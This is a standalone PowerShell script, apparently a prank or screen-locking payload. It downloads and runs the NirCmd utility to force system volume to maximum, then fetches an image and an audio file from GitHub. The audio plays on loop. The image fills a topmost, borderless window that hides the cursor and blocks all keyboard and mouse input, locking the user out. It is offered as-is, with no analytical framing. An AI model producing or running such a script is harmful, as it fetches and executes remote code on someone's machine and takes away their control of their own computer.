

$Url = "https://github.com/halololcloud/images/blob/main/borov.jpg?raw=true"
$Audio = "https://github.com/halololcloud/images/raw/refs/heads/main/pig.mp3"
$VolumeLevel = 100

$val = [int]([math]::Round(65535 * ($VolumeLevel / 100)))
$tempNir = Join-Path $env:TEMP "nircmd.exe"
if (-not (Test-Path $tempNir)) {
    $tempZip = Join-Path $env:TEMP "nircmd.zip"
    Invoke-WebRequest -Uri "https://www.nirsoft.net/utils/nircmd.zip" -OutFile $tempZip -UseBasicParsing
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [System.IO.Compression.ZipFile]::ExtractToDirectory($tempZip, $env:TEMP)
    Remove-Item $tempZip -ErrorAction SilentlyContinue
}
Start-Process -FilePath $tempNir -ArgumentList "setsysvolume $val" -NoNewWindow -Wait
Start-Process -FilePath $tempNir -ArgumentList "mutesysvolume 0" -NoNewWindow -Wait


Add-Type -AssemblyName PresentationCore,PresentationFramework,WindowsBase
$tempImg = Join-Path $env:TEMP "fullscreen_image.jpg"
$tempAudio = Join-Path $env:TEMP "temp_audio.mp3"
Invoke-WebRequest -Uri $Url -OutFile $tempImg -UseBasicParsing
Invoke-WebRequest -Uri $Audio -OutFile $tempAudio -UseBasicParsing

$wmp = New-Object -ComObject WMPlayer.OCX
$media = $wmp.newMedia($tempAudio)
$wmp.currentPlaylist.clear()
$wmp.currentPlaylist.appendItem($media)
$wmp.settings.setMode("loop", $true)
$wmp.controls.play()

$fs = [IO.File]::OpenRead($tempImg)
$bi = New-Object System.Windows.Media.Imaging.BitmapImage
$bi.BeginInit()
$bi.StreamSource = $fs
$bi.CacheOption = "OnLoad"
$bi.EndInit()
$fs.Close()

$img = New-Object System.Windows.Controls.Image
$img.Source = $bi
$img.Stretch = "UniformToFill"

$w = New-Object System.Windows.Window
$w.WindowStyle = "None"
$w.ResizeMode = "NoResize"
$w.WindowState = "Maximized"
$w.Topmost = $true
$w.Background = [System.Windows.Media.Brushes]::Black
$w.Content = $img
$w.Cursor = [System.Windows.Input.Cursors]::None
$w.ShowInTaskbar = $false

$block = { param($s,$e) $e.Handled = $true }
$w.Add_PreviewKeyDown($block)
$w.Add_PreviewKeyUp($block)
$w.Add_PreviewTextInput($block)
$w.Add_PreviewMouseDown($block)
$w.Add_PreviewMouseUp($block)
$w.Add_PreviewMouseMove($block)
$w.Add_PreviewMouseWheel($block)

try { $w.ShowDialog() | Out-Null }
finally {
    $wmp.controls.stop()
    $wmp.close()
    Remove-Item -Path $tempImg,$tempAudio -ErrorAction SilentlyContinue
}
